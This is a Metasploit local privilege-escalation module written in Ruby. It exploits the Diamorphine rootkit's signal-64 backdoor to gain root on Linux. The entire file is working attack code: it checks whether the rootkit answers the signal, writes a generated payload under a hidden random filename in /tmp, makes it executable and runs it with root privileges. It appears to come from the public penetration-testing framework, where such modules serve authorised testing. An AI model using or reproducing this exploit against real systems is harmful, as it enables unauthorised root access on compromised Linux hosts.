# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Diamorphine Rootkit Signal Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module uses Diamorphine rootkit&#039;s privesc feature using signal
        64 to elevate the privileges of arbitrary processes to UID 0 (root).

        This module has been tested successfully with Diamorphine from `master`
        branch (2019-10-04) on Linux Mint 19 kernel 4.15.0-20-generic (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;m0nad&#039;, # Diamorphine
          &#039;bcoles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2013-11-07&#039;, # Diamorphine first public commit
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://github.com/m0nad/Diamorphine&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;Notes&#039;          =>
        {
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptInt.new(&#039;SIGNAL&#039;, [true, &#039;Diamorphine elevate signal&#039;, 64])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def signal
    datastore[&#039;SIGNAL&#039;].to_s
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload_and_chmodx(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    write_file path, data
    chmod path, 0755
  end

  def cmd_exec_elevated(cmd)
    vprint_status "Executing #{cmd} ..."
    res = cmd_exec("sh -c &#039;kill -#{signal} $$ && #{cmd}&#039;").to_s
    vprint_line res unless res.blank?
    res
  end

  def check
    res = cmd_exec_elevated &#039;id&#039;

    if res.include?(&#039;invalid signal&#039;)
      return CheckCode::Safe("Signal &#039;#{signal}&#039; is invalid")
    end

    unless res.include?(&#039;uid=0&#039;)
      return CheckCode::Safe("Diamorphine is not installed, or incorrect signal &#039;#{signal}&#039;")
    end

    CheckCode::Vulnerable("Diamorphine is installed and configured to handle signal &#039;#{signal}&#039;.")
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 8..12}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe
    register_file_for_cleanup payload_path

    cmd_exec_elevated "#{payload_path} & echo "
  end
end

